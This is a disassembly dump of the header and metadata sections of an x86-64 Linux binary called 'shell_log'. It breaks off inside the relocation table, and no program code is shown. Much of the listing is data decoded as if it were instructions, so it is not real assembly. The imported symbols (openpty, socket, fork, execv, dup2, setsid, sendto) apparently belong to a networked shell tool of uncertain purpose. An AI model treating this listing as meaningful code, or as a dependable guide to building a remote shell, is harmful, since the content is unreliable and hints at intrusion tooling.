
./shell_log:     file format elf64-x86-64


Disassembly of section .interp:

0000000000400238 <.interp>:
  400238:	2f                   	(bad)  
  400239:	6c                   	insb   (%dx),%es:(%rdi)
  40023a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
  400241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
  400246:	78 2d                	js     400275 <_init-0xb23>
  400248:	78 38                	js     400282 <_init-0xb16>
  40024a:	36                   	ss
  40024b:	2d 36 34 2e 73       	sub    $0x732e3436,%eax
  400250:	6f                   	outsl  %ds:(%rsi),(%dx)
  400251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000400254 <.note.ABI-tag>:
  400254:	04 00                	add    $0x0,%al
  400256:	00 00                	add    %al,(%rax)
  400258:	10 00                	adc    %al,(%rax)
  40025a:	00 00                	add    %al,(%rax)
  40025c:	01 00                	add    %eax,(%rax)
  40025e:	00 00                	add    %al,(%rax)
  400260:	47                   	rex.RXB
  400261:	4e 55                	rex.WRX push %rbp
  400263:	00 00                	add    %al,(%rax)
  400265:	00 00                	add    %al,(%rax)
  400267:	00 02                	add    %al,(%rdx)
  400269:	00 00                	add    %al,(%rax)
  40026b:	00 06                	add    %al,(%rsi)
  40026d:	00 00                	add    %al,(%rax)
  40026f:	00 18                	add    %bl,(%rax)
  400271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000400274 <.note.gnu.build-id>:
  400274:	04 00                	add    $0x0,%al
  400276:	00 00                	add    %al,(%rax)
  400278:	14 00                	adc    $0x0,%al
  40027a:	00 00                	add    %al,(%rax)
  40027c:	03 00                	add    (%rax),%eax
  40027e:	00 00                	add    %al,(%rax)
  400280:	47                   	rex.RXB
  400281:	4e 55                	rex.WRX push %rbp
  400283:	00 00                	add    %al,(%rax)
  400285:	3d 7a 57 d0 c5       	cmp    $0xc5d0577a,%eax
  40028a:	f2 04 eb             	repnz add $0xeb,%al
  40028d:	d2 6b 49             	shrb   %cl,0x49(%rbx)
  400290:	0e                   	(bad)  
  400291:	78 92                	js     400225 <_init-0xb73>
  400293:	a7                   	cmpsl  %es:(%rdi),%ds:(%rsi)
  400294:	38                   	.byte 0x38
  400295:	0d                   	.byte 0xd
  400296:	f9                   	stc    
  400297:	4b                   	rex.WXB

Disassembly of section .gnu.hash:

0000000000400298 <.gnu.hash>:
  400298:	01 00                	add    %eax,(%rax)
  40029a:	00 00                	add    %al,(%rax)
  40029c:	01 00                	add    %eax,(%rax)
  40029e:	00 00                	add    %al,(%rax)
  4002a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000004002b8 <.dynsym>:
	...
  4002d0:	d9 00                	flds   (%rax)
  4002d2:	00 00                	add    %al,(%rax)
  4002d4:	12 00                	adc    (%rax),%al
	...
  4002e6:	00 00                	add    %al,(%rax)
  4002e8:	fb                   	sti    
  4002e9:	00 00                	add    %al,(%rax)
  4002eb:	00 12                	add    %dl,(%rdx)
	...
  4002fd:	00 00                	add    %al,(%rax)
  4002ff:	00 0e                	add    %cl,(%rsi)
  400301:	00 00                	add    %al,(%rax)
  400303:	00 20                	add    %ah,(%rax)
	...
  400315:	00 00                	add    %al,(%rax)
  400317:	00 b9 00 00 00 12    	add    %bh,0x12000000(%rcx)
	...
  40032d:	00 00                	add    %al,(%rax)
  40032f:	00 ed                	add    %ch,%ch
  400331:	00 00                	add    %al,(%rax)
  400333:	00 12                	add    %dl,(%rdx)
	...
  400345:	00 00                	add    %al,(%rax)
  400347:	00 97 01 00 00 12    	add    %dl,0x12000001(%rdi)
	...
  40035d:	00 00                	add    %al,(%rax)
  40035f:	00 f4                	add    %dh,%ah
  400361:	00 00                	add    %al,(%rax)
  400363:	00 12                	add    %dl,(%rdx)
	...
  400375:	00 00                	add    %al,(%rax)
  400377:	00 c8                	add    %cl,%al
  400379:	00 00                	add    %al,(%rax)
  40037b:	00 12                	add    %dl,(%rdx)
	...
  40038d:	00 00                	add    %al,(%rax)
  40038f:	00 4c 01 00          	add    %cl,0x0(%rcx,%rax,1)
  400393:	00 12                	add    %dl,(%rdx)
	...
  4003a5:	00 00                	add    %al,(%rax)
  4003a7:	00 8e 00 00 00 12    	add    %cl,0x12000000(%rsi)
	...
  4003bd:	00 00                	add    %al,(%rax)
  4003bf:	00 2a                	add    %ch,(%rdx)
  4003c1:	01 00                	add    %eax,(%rax)
  4003c3:	00 12                	add    %dl,(%rdx)
	...
  4003d5:	00 00                	add    %al,(%rax)
  4003d7:	00 9f 01 00 00 12    	add    %bl,0x12000001(%rdi)
	...
  4003ed:	00 00                	add    %al,(%rax)
  4003ef:	00 9d 01 00 00 12    	add    %bl,0x12000001(%rbp)
	...
  400405:	00 00                	add    %al,(%rax)
  400407:	00 aa 00 00 00 12    	add    %ch,0x12000000(%rdx)
	...
  40041d:	00 00                	add    %al,(%rax)
  40041f:	00 80 00 00 00 12    	add    %al,0x12000000(%rax)
	...
  400435:	00 00                	add    %al,(%rax)
  400437:	00 5a 01             	add    %bl,0x1(%rdx)
  40043a:	00 00                	add    %al,(%rax)
  40043c:	12 00                	adc    (%rax),%al
	...
  40044e:	00 00                	add    %al,(%rax)
  400450:	3d 01 00 00 12       	cmp    $0x12000001,%eax
	...
  400465:	00 00                	add    %al,(%rax)
  400467:	00 6d 01             	add    %ch,0x1(%rbp)
  40046a:	00 00                	add    %al,(%rax)
  40046c:	12 00                	adc    (%rax),%al
	...
  40047e:	00 00                	add    %al,(%rax)
  400480:	67 01 00             	add    %eax,(%eax)
  400483:	00 12                	add    %dl,(%rdx)
	...
  400495:	00 00                	add    %al,(%rax)
  400497:	00 7e 01             	add    %bh,0x1(%rsi)
  40049a:	00 00                	add    %al,(%rax)
  40049c:	12 00                	adc    (%rax),%al
	...
  4004ae:	00 00                	add    %al,(%rax)
  4004b0:	16                   	(bad)  
  4004b1:	01 00                	add    %eax,(%rax)
  4004b3:	00 12                	add    %dl,(%rdx)
	...
  4004c5:	00 00                	add    %al,(%rax)
  4004c7:	00 85 01 00 00 12    	add    %al,0x12000001(%rbp)
	...
  4004dd:	00 00                	add    %al,(%rax)
  4004df:	00 9a 00 00 00 12    	add    %bl,0x12000000(%rdx)
	...
  4004f5:	00 00                	add    %al,(%rax)
  4004f7:	00 1b                	add    %bl,(%rbx)
  4004f9:	01 00                	add    %eax,(%rax)
  4004fb:	00 12                	add    %dl,(%rdx)
	...
  40050d:	00 00                	add    %al,(%rax)
  40050f:	00 b2 00 00 00 12    	add    %dh,0x12000000(%rdx)
	...
  400525:	00 00                	add    %al,(%rax)
  400527:	00 2a                	add    %ch,(%rdx)
  400529:	00 00                	add    %al,(%rax)
  40052b:	00 20                	add    %ah,(%rax)
	...
  40053d:	00 00                	add    %al,(%rax)
  40053f:	00 2f                	add    %ch,(%rdi)
  400541:	01 00                	add    %eax,(%rax)
  400543:	00 12                	add    %dl,(%rdx)
	...
  400555:	00 00                	add    %al,(%rax)
  400557:	00 e8                	add    %ch,%al
  400559:	00 00                	add    %al,(%rax)
  40055b:	00 12                	add    %dl,(%rdx)
	...
  40056d:	00 00                	add    %al,(%rax)
  40056f:	00 67 00             	add    %ah,0x0(%rdi)
  400572:	00 00                	add    %al,(%rax)
  400574:	12 00                	adc    (%rax),%al
	...
  400586:	00 00                	add    %al,(%rax)
  400588:	c3                   	retq   
  400589:	00 00                	add    %al,(%rax)
  40058b:	00 12                	add    %dl,(%rdx)
	...
  40059d:	00 00                	add    %al,(%rax)
  40059f:	00 e1                	add    %ah,%cl
  4005a1:	00 00                	add    %al,(%rax)
  4005a3:	00 12                	add    %dl,(%rdx)
	...
  4005b5:	00 00                	add    %al,(%rax)
  4005b7:	00 a0 00 00 00 12    	add    %ah,0x12000000(%rax)
	...
  4005cd:	00 00                	add    %al,(%rax)
  4005cf:	00 36                	add    %dh,(%rsi)
  4005d1:	01 00                	add    %eax,(%rax)
  4005d3:	00 12                	add    %dl,(%rdx)
	...
  4005e5:	00 00                	add    %al,(%rax)
  4005e7:	00 43 01             	add    %al,0x1(%rbx)
  4005ea:	00 00                	add    %al,(%rax)
  4005ec:	12 00                	adc    (%rax),%al
	...
  4005fe:	00 00                	add    %al,(%rax)
  400600:	22 01                	and    (%rcx),%al
  400602:	00 00                	add    %al,(%rax)
  400604:	12 00                	adc    (%rax),%al
	...
  400616:	00 00                	add    %al,(%rax)
  400618:	74 01                	je     40061b <_init-0x77d>
  40061a:	00 00                	add    %al,(%rax)
  40061c:	12 00                	adc    (%rax),%al
	...
  40062e:	00 00                	add    %al,(%rax)
  400630:	0c 01                	or     $0x1,%al
  400632:	00 00                	add    %al,(%rax)
  400634:	12 00                	adc    (%rax),%al
	...
  400646:	00 00                	add    %al,(%rax)
  400648:	39 00                	cmp    %eax,(%rax)
  40064a:	00 00                	add    %al,(%rax)
  40064c:	20 00                	and    %al,(%rax)
	...
  40065e:	00 00                	add    %al,(%rax)
  400660:	89 00                	mov    %eax,(%rax)
  400662:	00 00                	add    %al,(%rax)
  400664:	12 00                	adc    (%rax),%al
	...
  400676:	00 00                	add    %al,(%rax)
  400678:	4d 00 00             	rex.WRB add %r8b,(%r8)
  40067b:	00 20                	add    %ah,(%rax)
	...
  40068d:	00 00                	add    %al,(%rax)
  40068f:	00 94 00 00 00 12 00 	add    %dl,0x120000(%rax,%rax,1)
	...
  4006a6:	00 00                	add    %al,(%rax)
  4006a8:	be 00 00 00 12       	mov    $0x12000000,%esi
	...
  4006bd:	00 00                	add    %al,(%rax)
  4006bf:	00 9b 00 00 00 12    	add    %bl,0x12000000(%rbx)
	...
  4006d5:	00 00                	add    %al,(%rax)
  4006d7:	00 53 01             	add    %dl,0x1(%rbx)
  4006da:	00 00                	add    %al,(%rax)
  4006dc:	12 00                	adc    (%rax),%al
	...
  4006ee:	00 00                	add    %al,(%rax)
  4006f0:	79 00                	jns    4006f2 <_init-0x6a6>
  4006f2:	00 00                	add    %al,(%rax)
  4006f4:	12 00                	adc    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000400708 <.dynstr>:
  400708:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
  40070c:	75 74                	jne    400782 <_init-0x616>
  40070e:	69 6c 2e 73 6f 2e 31 	imul   $0x312e6f,0x73(%rsi,%rbp,1),%ebp
  400715:	00 
  400716:	5f                   	pop    %rdi
  400717:	49 54                	rex.WB push %r12
  400719:	4d 5f                	rex.WRB pop %r15
  40071b:	64                   	fs
  40071c:	65                   	gs
  40071d:	72 65                	jb     400784 <_init-0x614>
  40071f:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
  400726:	4d 
  400727:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
  400729:	6f                   	outsl  %ds:(%rsi),(%dx)
  40072a:	6e                   	outsb  %ds:(%rsi),(%dx)
  40072b:	65                   	gs
  40072c:	54                   	push   %rsp
  40072d:	61                   	(bad)  
  40072e:	62                   	(bad)  
  40072f:	6c                   	insb   (%dx),%es:(%rdi)
  400730:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
  400734:	67 6d                	insl   (%dx),%es:(%edi)
  400736:	6f                   	outsl  %ds:(%rsi),(%dx)
  400737:	6e                   	outsb  %ds:(%rsi),(%dx)
  400738:	5f                   	pop    %rdi
  400739:	73 74                	jae    4007af <_init-0x5e9>
  40073b:	61                   	(bad)  
  40073c:	72 74                	jb     4007b2 <_init-0x5e6>
  40073e:	5f                   	pop    %rdi
  40073f:	5f                   	pop    %rdi
  400740:	00 5f 4a             	add    %bl,0x4a(%rdi)
  400743:	76 5f                	jbe    4007a4 <_init-0x5f4>
  400745:	52                   	push   %rdx
  400746:	65 67 69 73 74 65 72 	imul   $0x6c437265,%gs:0x74(%ebx),%esi
  40074d:	43 6c 
  40074f:	61                   	(bad)  
  400750:	73 73                	jae    4007c5 <_init-0x5d3>
  400752:	65                   	gs
  400753:	73 00                	jae    400755 <_init-0x643>
  400755:	5f                   	pop    %rdi
  400756:	49 54                	rex.WB push %r12
  400758:	4d 5f                	rex.WRB pop %r15
  40075a:	72 65                	jb     4007c1 <_init-0x5d7>
  40075c:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
  400763:	4d 
  400764:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
  400766:	6f                   	outsl  %ds:(%rsi),(%dx)
  400767:	6e                   	outsb  %ds:(%rsi),(%dx)
  400768:	65                   	gs
  400769:	54                   	push   %rsp
  40076a:	61                   	(bad)  
  40076b:	62                   	(bad)  
  40076c:	6c                   	insb   (%dx),%es:(%rdi)
  40076d:	65 00 6f 70          	add    %ch,%gs:0x70(%rdi)
  400771:	65 6e                	outsb  %gs:(%rsi),(%dx)
  400773:	70 74                	jo     4007e9 <_init-0x5af>
  400775:	79 00                	jns    400777 <_init-0x621>
  400777:	6c                   	insb   (%dx),%es:(%rdi)
  400778:	69 62 63 2e 73 6f 2e 	imul   $0x2e6f732e,0x63(%rdx),%esp
  40077f:	36 00 73 6f          	add    %dh,%ss:0x6f(%rbx)
  400783:	63 6b 65             	movslq 0x65(%rbx),%ebp
  400786:	74 00                	je     400788 <_init-0x610>
  400788:	67 6d                	insl   (%dx),%es:(%edi)
  40078a:	74 69                	je     4007f5 <_init-0x5a3>
  40078c:	6d                   	insl   (%dx),%es:(%rdi)
  40078d:	65                   	gs
  40078e:	5f                   	pop    %rdi
  40078f:	72 00                	jb     400791 <_init-0x607>
  400791:	65                   	gs
  400792:	78 69                	js     4007fd <_init-0x59b>
  400794:	74 00                	je     400796 <_init-0x602>
  400796:	68 74 6f 6e 73       	pushq  $0x736e6f74
  40079b:	00 65 78             	add    %ah,0x78(%rbp)
  40079e:	65 63 76 00          	movslq %gs:0x0(%rsi),%esi
  4007a2:	73 72                	jae    400816 <_init-0x582>
  4007a4:	61                   	(bad)  
  4007a5:	6e                   	outsb  %ds:(%rsi),(%dx)
  4007a6:	64 00 69 6e          	add    %ch,%fs:0x6e(%rcx)
  4007aa:	65                   	gs
  4007ab:	74 5f                	je     40080c <_init-0x58c>
  4007ad:	61                   	(bad)  
  4007ae:	74 6f                	je     40081f <_init-0x579>
  4007b0:	6e                   	outsb  %ds:(%rsi),(%dx)
  4007b1:	00 73 74             	add    %dh,0x74(%rbx)
  4007b4:	72 72                	jb     400828 <_init-0x570>
  4007b6:	63 68 72             	movslq 0x72(%rax),%ebp
  4007b9:	00 73 69             	add    %dh,0x69(%rbx)
  4007bc:	67 6e                	outsb  %ds:(%esi),(%dx)
  4007be:	61                   	(bad)  
  4007bf:	6c                   	insb   (%dx),%es:(%rdi)
  4007c0:	00 70 75             	add    %dh,0x75(%rax)
  4007c3:	74 73                	je     400838 <_init-0x560>
  4007c5:	00 66 6f             	add    %ah,0x6f(%rsi)
  4007c8:	72 6b                	jb     400835 <_init-0x563>
  4007ca:	00 74 69 6d          	add    %dh,0x6d(%rcx,%rbp,2)
  4007ce:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
  4007d2:	73 74                	jae    400848 <_init-0x550>
  4007d4:	61                   	(bad)  
  4007d5:	63 6b 5f             	movslq 0x5f(%rbx),%ebp
  4007d8:	63 68 6b             	movslq 0x6b(%rax),%ebp
  4007db:	5f                   	pop    %rdi
  4007dc:	66                   	data16
  4007dd:	61                   	(bad)  
  4007de:	69 6c 00 70 75 74 63 	imul   $0x68637475,0x70(%rax,%rax,1),%ebp
  4007e5:	68 
  4007e6:	61                   	(bad)  
  4007e7:	72 00                	jb     4007e9 <_init-0x5af>
  4007e9:	73 65                	jae    400850 <_init-0x548>
  4007eb:	6c                   	insb   (%dx),%es:(%rdi)
  4007ec:	65 63 74 00 6b       	movslq %gs:0x6b(%rax,%rax,1),%esi
  4007f1:	69 6c 6c 00 69 73 61 	imul   $0x74617369,0x0(%rsp,%rbp,2),%ebp
  4007f8:	74 
  4007f9:	74 79                	je     400874 <_init-0x524>
  4007fb:	00 73 74             	add    %dh,0x74(%rbx)
  4007fe:	72 6c                	jb     40086c <_init-0x52c>
  400800:	65 6e                	outsb  %gs:(%rsi),(%dx)
  400802:	00 5f 5f             	add    %bl,0x5f(%rdi)
  400805:	65                   	gs
  400806:	72 72                	jb     40087a <_init-0x51e>
  400808:	6e                   	outsb  %ds:(%rsi),(%dx)
  400809:	6f                   	outsl  %ds:(%rsi),(%dx)
  40080a:	5f                   	pop    %rdi
  40080b:	6c                   	insb   (%dx),%es:(%rdi)
  40080c:	6f                   	outsl  %ds:(%rsi),(%dx)
  40080d:	63 61 74             	movslq 0x74(%rcx),%esp
  400810:	69 6f 6e 00 74 63 73 	imul   $0x73637400,0x6e(%rdi),%ebp
  400817:	65                   	gs
  400818:	74 61                	je     40087b <_init-0x51d>
  40081a:	74 74                	je     400890 <_init-0x508>
  40081c:	72 00                	jb     40081e <_init-0x57a>
  40081e:	72 65                	jb     400885 <_init-0x513>
  400820:	61                   	(bad)  
  400821:	64 00 6d 65          	add    %ch,%fs:0x65(%rbp)
  400825:	6d                   	insl   (%dx),%es:(%rdi)
  400826:	63 6d 70             	movslq 0x70(%rbp),%ebp
  400829:	00 74 74 79          	add    %dh,0x79(%rsp,%rsi,2)
  40082d:	6e                   	outsb  %ds:(%rsi),(%dx)
  40082e:	61                   	(bad)  
  40082f:	6d                   	insl   (%dx),%es:(%rdi)
  400830:	65 00 64 75 70       	add    %ah,%gs:0x70(%rbp,%rsi,2)
  400835:	32 00                	xor    (%rax),%al
  400837:	6d                   	insl   (%dx),%es:(%rdi)
  400838:	65                   	gs
  400839:	6d                   	insl   (%dx),%es:(%rdi)
  40083a:	63 70 79             	movslq 0x79(%rax),%esi
  40083d:	00 6d 61             	add    %ch,0x61(%rbp)
  400840:	6c                   	insb   (%dx),%es:(%rdi)
  400841:	6c                   	insb   (%dx),%es:(%rdi)
  400842:	6f                   	outsl  %ds:(%rsi),(%dx)
  400843:	63 00                	movslq (%rax),%eax
  400845:	69 6f 63 74 6c 00 67 	imul   $0x67006c74,0x63(%rdi),%ebp
  40084c:	65                   	gs
  40084d:	74 6c                	je     4008bb <_init-0x4dd>
  40084f:	6f                   	outsl  %ds:(%rsi),(%dx)
  400850:	67 69 6e 00 67 65 74 	imul   $0x75746567,0x0(%esi),%ebp
  400857:	75 
  400858:	69 64 00 75 73 6c 65 	imul   $0x65656c73,0x75(%rax,%rax,1),%esp
  40085f:	65 
  400860:	70 00                	jo     400862 <_init-0x536>
  400862:	67                   	addr32
  400863:	65                   	gs
  400864:	74 74                	je     4008da <_init-0x4be>
  400866:	69 6d 65 6f 66 64 61 	imul   $0x6164666f,0x65(%rbp),%ebp
  40086d:	79 00                	jns    40086f <_init-0x529>
  40086f:	63 6c 6f 73          	movslq 0x73(%rdi,%rbp,2),%ebp
  400873:	65 00 73 65          	add    %dh,%gs:0x65(%rbx)
  400877:	6e                   	outsb  %ds:(%rsi),(%dx)
  400878:	64                   	fs
  400879:	74 6f                	je     4008ea <_init-0x4ae>
  40087b:	00 74 63 67          	add    %dh,0x67(%rbx,%riz,2)
  40087f:	65                   	gs
  400880:	74 61                	je     4008e3 <_init-0x4b5>
  400882:	74 74                	je     4008f8 <_init-0x4a0>
  400884:	72 00                	jb     400886 <_init-0x512>
  400886:	73 65                	jae    4008ed <_init-0x4ab>
  400888:	74 73                	je     4008fd <_init-0x49b>
  40088a:	69 64 00 5f 5f 6c 69 	imul   $0x62696c5f,0x5f(%rax,%rax,1),%esp
  400891:	62 
  400892:	63 5f 73             	movslq 0x73(%rdi),%ebx
  400895:	74 61                	je     4008f8 <_init-0x4a0>
  400897:	72 74                	jb     40090d <_init-0x48b>
  400899:	5f                   	pop    %rdi
  40089a:	6d                   	insl   (%dx),%es:(%rdi)
  40089b:	61                   	(bad)  
  40089c:	69 6e 00 77 72 69 74 	imul   $0x74697277,0x0(%rsi),%ebp
  4008a3:	65 00 73 6e          	add    %dh,%gs:0x6e(%rbx)
  4008a7:	70 72                	jo     40091b <_init-0x47d>
  4008a9:	69 6e 74 66 00 47 4c 	imul   $0x4c470066,0x74(%rsi),%ebp
  4008b0:	49                   	rex.WB
  4008b1:	42                   	rex.X
  4008b2:	43 5f                	rex.XB pop %r15
  4008b4:	32 2e                	xor    (%rsi),%ch
  4008b6:	32 2e                	xor    (%rsi),%ch
  4008b8:	35 00 47 4c 49       	xor    $0x494c4700,%eax
  4008bd:	42                   	rex.X
  4008be:	43 5f                	rex.XB pop %r15
  4008c0:	32 2e                	xor    (%rsi),%ch
  4008c2:	31 34 00             	xor    %esi,(%rax,%rax,1)
  4008c5:	47                   	rex.RXB
  4008c6:	4c                   	rex.WR
  4008c7:	49                   	rex.WB
  4008c8:	42                   	rex.X
  4008c9:	43 5f                	rex.XB pop %r15
  4008cb:	32 2e                	xor    (%rsi),%ch
  4008cd:	34 00                	xor    $0x0,%al

Disassembly of section .gnu.version:

00000000004008d0 <.gnu.version>:
  4008d0:	00 00                	add    %al,(%rax)
  4008d2:	02 00                	add    (%rax),%al
  4008d4:	02 00                	add    (%rax),%al
  4008d6:	00 00                	add    %al,(%rax)
  4008d8:	02 00                	add    (%rax),%al
  4008da:	02 00                	add    (%rax),%al
  4008dc:	02 00                	add    (%rax),%al
  4008de:	02 00                	add    (%rax),%al
  4008e0:	03 00                	add    (%rax),%eax
  4008e2:	02 00                	add    (%rax),%al
  4008e4:	02 00                	add    (%rax),%al
  4008e6:	02 00                	add    (%rax),%al
  4008e8:	02 00                	add    (%rax),%al
  4008ea:	02 00                	add    (%rax),%al
  4008ec:	02 00                	add    (%rax),%al
  4008ee:	02 00                	add    (%rax),%al
  4008f0:	02 00                	add    (%rax),%al
  4008f2:	02 00                	add    (%rax),%al
  4008f4:	02 00                	add    (%rax),%al
  4008f6:	02 00                	add    (%rax),%al
  4008f8:	02 00                	add    (%rax),%al
  4008fa:	02 00                	add    (%rax),%al
  4008fc:	02 00                	add    (%rax),%al
  4008fe:	02 00                	add    (%rax),%al
  400900:	02 00                	add    (%rax),%al
  400902:	02 00                	add    (%rax),%al
  400904:	00 00                	add    %al,(%rax)
  400906:	04 00                	add    $0x0,%al
  400908:	02 00                	add    (%rax),%al
  40090a:	05 00 02 00 02       	add    $0x2000200,%eax
  40090f:	00 02                	add    %al,(%rdx)
  400911:	00 02                	add    %al,(%rdx)
  400913:	00 02                	add    %al,(%rdx)
  400915:	00 02                	add    %al,(%rdx)
  400917:	00 02                	add    %al,(%rdx)
  400919:	00 02                	add    %al,(%rdx)
  40091b:	00 00                	add    %al,(%rax)
  40091d:	00 02                	add    %al,(%rdx)
  40091f:	00 00                	add    %al,(%rax)
  400921:	00 02                	add    %al,(%rdx)
  400923:	00 02                	add    %al,(%rdx)
  400925:	00 02                	add    %al,(%rdx)
  400927:	00 02                	add    %al,(%rdx)
  400929:	00 02                	add    %al,(%rdx)
	...

Disassembly of section .gnu.version_r:

0000000000400930 <.gnu.version_r>:
  400930:	01 00                	add    %eax,(%rax)
  400932:	01 00                	add    %eax,(%rax)
  400934:	01 00                	add    %eax,(%rax)
  400936:	00 00                	add    %al,(%rax)
  400938:	10 00                	adc    %al,(%rax)
  40093a:	00 00                	add    %al,(%rax)
  40093c:	20 00                	and    %al,(%rax)
  40093e:	00 00                	add    %al,(%rax)
  400940:	75 1a                	jne    40095c <_init-0x43c>
  400942:	69 09 00 00 05 00    	imul   $0x50000,(%rcx),%ecx
  400948:	a6                   	cmpsb  %es:(%rdi),%ds:(%rsi)
  400949:	01 00                	add    %eax,(%rax)
  40094b:	00 00                	add    %al,(%rax)
  40094d:	00 00                	add    %al,(%rax)
  40094f:	00 01                	add    %al,(%rcx)
  400951:	00 03                	add    %al,(%rbx)
  400953:	00 6f 00             	add    %ch,0x0(%rdi)
  400956:	00 00                	add    %al,(%rax)
  400958:	10 00                	adc    %al,(%rax)
  40095a:	00 00                	add    %al,(%rax)
  40095c:	00 00                	add    %al,(%rax)
  40095e:	00 00                	add    %al,(%rax)
  400960:	94                   	xchg   %eax,%esp
  400961:	91                   	xchg   %eax,%ecx
  400962:	96                   	xchg   %eax,%esi
  400963:	06                   	(bad)  
  400964:	00 00                	add    %al,(%rax)
  400966:	04 00                	add    $0x0,%al
  400968:	b2 01                	mov    $0x1,%dl
  40096a:	00 00                	add    %al,(%rax)
  40096c:	10 00                	adc    %al,(%rax)
  40096e:	00 00                	add    %al,(%rax)
  400970:	14 69                	adc    $0x69,%al
  400972:	69 0d 00 00 03 00 bd 	imul   $0x1bd,0x30000(%rip),%ecx        # 43097c <__FRAME_END__+0x289ec>
  400979:	01 00 00 
  40097c:	10 00                	adc    %al,(%rax)
  40097e:	00 00                	add    %al,(%rax)
  400980:	75 1a                	jne    40099c <_init-0x3fc>
  400982:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
  400988:	a6                   	cmpsb  %es:(%rdi),%ds:(%rsi)
  400989:	01 00                	add    %eax,(%rax)
  40098b:	00 00                	add    %al,(%rax)
  40098d:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000400990 <.rela.dyn>:
  400990:	f8                   	clc    
  400991:	8f                   	(bad)  
  400992:	60                   	(bad)  
  400993:	00 00                	add    %al,(%rax)
  400995:	00 00                	add    %al,(%rax)
  400997:	00 06                	add    %al,(%rsi)
  400999:	00 00                	add    %al,(%rax)
  40099b:	00 1a                	add    %bl,(%rdx)
	...

Disassembly of section .rela.plt:

00000000004009a8 <.rela.plt>:
  4009a8:	18 90 60 00 00 00    	sbb    %dl,0x60(%rax)
  4009ae:	00 00                	add    %al,(%rax)
  4009b0:	07                   	(bad)  
  4009b1:	00 00                	add    %al,(%rax)
  4009b3:	00 01                	add    %al,(%rcx)
	...
  4009bd:	00 00                	add    %al,(%rax)
  4009bf:	00 20                	add    %ah,(%rax)
  4009c1:	90                   	nop
  4009c2:	60                   	(bad)  
  4009c3:	00 00                	add    %al,(%rax)
  4009c5:	00 00                	add    %al,(%rax)
  4009c7:	00 07                	add    %al,(%rdi)
  4009c9:	00 00                	add    %al,(%rax)
  4009cb:	00 02                	add    %al,(%rdx)
	...
  4009d5:	00 00                	add    %al,(%rax)
  4009d7:	00 28                	add    %ch,(%rax)
  4009d9:	90                   	nop
  4009da:	60                   	(bad)  
  4009db:	00 00                	add    %al,(%rax)
  4009dd:	00 00                	add    %al,(%rax)
  4009df:	00 07                	add    %al,(%rdi)
  4009e1:	00 00                	add    %al,(%rax)
  4009e3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
  4009ee:	00 00                	add    %al,(%rax)
  4009f0:	30 90 60 00 00 00    	xor    %dl,0x60(%rax)
  4009f6:	00 00                	add    %al,(%rax)
  4009f8:	07                   	(bad)  
  4009f9:	00 00                	add    %al,(%rax)
  4009fb:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 400a01 <_init-0x397>
  400a01:	00 00                	add    %al,(%rax)
  400a03:	00 00                	add    %al,(%rax)
  400a05:	00 00                	add    %al,(%rax)
  400a07:	00 38                	add    %bh,(%rax)
  400a09:	90                   	nop
  400a0a:	60                   	(bad)  
  400a0b:	00 00                	add    %al,(%rax)
  400a0d:	00 00                	add    %al,(%rax)
  400a0f:	00 07                	add    %al,(%rdi)
  400a11:	00 00                	add    %al,(%rax)
  400a13:	00 06                	add    %al,(%rsi)
	...
  400a1d:	00 00                	add    %al,(%rax)
  400a1f:	00 40 90             	add    %al,-0x70(%rax)
  400a22:	60                   	(bad)  
  400a23:	00 00                	add    %al,(%rax)
  400a25:	00 00                	add    %al,(%rax)
  400a27:	00 07                	add    %al,(%rdi)
  400a29:	00 00                	add    %al,(%rax)
  400a2b:	00 07                	add    %al,(%rdi)
	...
  400a35:	00 00                	add    %al,(%rax)
  400a37:	00 48 90             	add    %cl,-0x70(%rax)
  400a3a:	60                   	(bad)  
  400a3b:	00 00                	add    %al,(%rax)
  400a3d:	00 00                	add    %al,(%rax)
  400a3f:	00 07                	add    %al,(%rdi)
  400a41:	00 00                	add    %al,(%rax)
  400a43:	00 08                	add    %cl,(%rax)
	...
  400a4d:	00 00                	add    %al,(%rax)
  400a4f:	00 50 90             	add    %dl,-0x70(%rax)
  400a52:	60                   	(bad)  
  400a53:	00 00                	add    %al,(%rax)
  400a55:	00 00                	add    %al,(%rax)
  400a57:	00 07                	add    %al,(%rdi)
  400a59:	00 00                	add    %al,(%rax)
  400a5b:	00 09                	add    %cl,(%rcx)
	...
  400a65:	00 00                	add    %al,(%rax)
  400a67:	00 58 90             	add    %bl,-0x70(%rax)
  400a6a:	60                   	(bad)  
  400a6b:	00 00                	add    %al,(%rax)
  400a6d:	00 00                	add    %al,(%rax)
  400a6f:	00 07                	add    %al,(%rdi)
  400a71:	00 00                	add    %al,(%rax)
  400a73:	00 0a                	add    %cl,(%rdx)
	...
  400a7d:	00 00                	add    %al,(%rax)
  400a7f:	00 60 90             	add    %ah,-0x70(%rax)
  400a82:	60                   	(bad)  
  400a83:	00 00                	add    %al,(%rax)
  400a85:	00 00                	add    %al,(%rax)
  400a87:	00 07                	add    %al,(%rdi)
  400a89:	00 00                	add    %al,(%rax)
  400a8b:	00 0b                	add    %cl,(%rbx)
	...
  400a95:	00 00                	add    %al,(%rax)
  400a97:	00 68 90             	add    %ch,-0x70(%rax)
  400a9a:	60                   	(bad)  
  400a9b:	00 00                	add    %al,(%rax)
  400a9d:	00 00                	add    %al,(%rax)
  400a9f:	00 07                	add    %al,(%rdi)
  400aa1:	00 00                	add    %al,(%rax)
  400aa3:	00 0c 00             	add    %cl,(%rax,%rax,1)
	...
  400aae:	00 00                	add    %al,(%rax)
  400ab0:	70 90                	jo     400a42 <_init-0x356>
  400ab2:	60                   	(bad)  
  400ab3:	00 00                	add    %al,(%rax)
